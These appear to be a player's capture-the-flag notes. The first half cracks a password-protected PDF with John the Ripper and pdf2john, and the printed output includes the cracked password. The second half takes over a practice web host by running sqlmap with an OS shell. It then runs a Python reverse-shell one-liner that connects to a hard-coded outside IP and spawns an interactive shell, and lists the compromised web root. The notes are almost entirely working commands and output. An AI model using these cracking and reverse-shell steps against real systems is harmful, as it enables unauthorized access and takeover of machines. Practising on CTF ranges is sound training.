MISC

## Finding the password to a protected pdf:
```
git clone https://github.com/magnumripper/JohnTheRipper.git
cd ./JohnTheRipper/src
./configure && make
cd ..
cd ./run

C:\home\slicer\repos\JohnTheRipper\run> ./pdf2john.pl ~/Downloads/pdfpassword.pdf > ~/Downloads/pdfhash

C:\home\slicer\Downloads> sudo john pdfhash 
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 4 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
football         (/home/slicer/Downloads/pdfpassword.pdf)
1g 0:00:00:00 DONE 2/3 (2020-03-06 13:13) 5.882g/s 238000p/s 238000c/s 238000C/s 123456..franklin
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed



{siht_dnif_uoy_did_woh}
```

http://bb.threatsims.com/
```
sqlmap -u http://bb.threatsims.com/index.php --forms --os-shell

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("165.227.195.68",5656));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


$ python -c 'import pty; pty.spawn("/bin/sh")'
$ ls
ls
404.php         tmpbszgm.php  tmpufnki.php  tmpunkre.php  tmpuvkpe.php
beanie-img.jpg  tmpbtmrj.php  tmpugkli.php  tmpunlvz.php  tmpuycbu.php
flag.txt        tmpbudaa.php  tmpujsqi.php  tmpunqnp.php  tmpuyroc.php
index.php       tmpbvuzl.php  tmpukjwy.php  tmpuqszn.php  tmpuzaqj.php
tmpbaedo.php    tmpbwklq.php  tmpukyke.php  tmpurspk.php  tmpuzbzj.php
tmpbixak.php    tmpbwkyb.php  tmpuljew.php  tmpuryfe.php  tmpuzmet.php
tmpbjoaj.php    tmpbxfua.php  tmpulqpi.php  tmpuryjo.php  tmpuznec.php
tmpblgbs.php    tmpbyiho.php  tmpumfua.php  tmpusgxn.php  tmpuzvum.php
tmpbmaqp.php    tmpbzwji.php  tmpumjvu.php  tmpushyv.php  tmpuzvwn.php
tmpbpphn.php    tmpuahbn.php  tmpundjg.php  tmpuspml.php  tmpuzwvj.php
tmpbqvka.php    tmpucgam.php  tmpundrf.php  tmpuswwg.php  tmpuzxin.php
tmpbqwyk.php    tmpucuih.php  tmpungtb.php  tmputruu.php  tmpuzxpz.php
tmpbsvzo.php    tmpucxvf.php  tmpunjdl.php  tmpuuehm.php
```
